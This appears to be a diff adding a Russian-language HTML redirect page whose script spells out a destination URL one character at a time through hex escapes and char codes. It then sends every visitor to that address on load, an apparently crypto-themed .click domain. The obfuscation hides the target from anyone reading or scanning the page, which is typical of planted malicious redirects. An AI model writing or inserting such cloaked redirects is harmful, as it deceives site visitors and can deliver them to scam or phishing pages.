@@ -1,0 +1,44 @@
+<!doctype html>
+<html lang="ru">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Перенаправление</title>
+  <script>
+    const els = [
+      () => String.fromCharCode(104),
+      () => String.fromCharCode(116),
+      () => String.fromCharCode(116),
+      () => String.fromCharCode(112),
+      function() { return '\x73'; },
+      function() { return '\x3a'; },
+      () => '\x2f',
+      () => String.fromCharCode(47),
+      () => '\x76',
+      function() { return '\x65'; },
+      v => '\x72',
+      k => '\x67',
+      function() { return '\x65'; },
+      () => '\x6e',
+      function() { return '\x2e'; },
+      p => '\x63',
+      () => '\x6c',
+      function() { return '\x69'; },
+      function() { return '\x63'; },
+      function() { return '\x6b'; },
+      m => '\x2f',
+      () => String.fromCharCode(115),
+      () => '\x2f',
+      () => String.fromCharCode(99),
+      () => '\x72',
+      () => String.fromCharCode(121),
+      () => '\x70',
+      function() { return '\x74'; },
+      function() { return '\x6f'; }
+    ];
+    const link = els.reduce((r, fn) => r + fn(), '');
+    window.location.replace(link);
+  </script>
+</head>
+<body></body>
+</html>
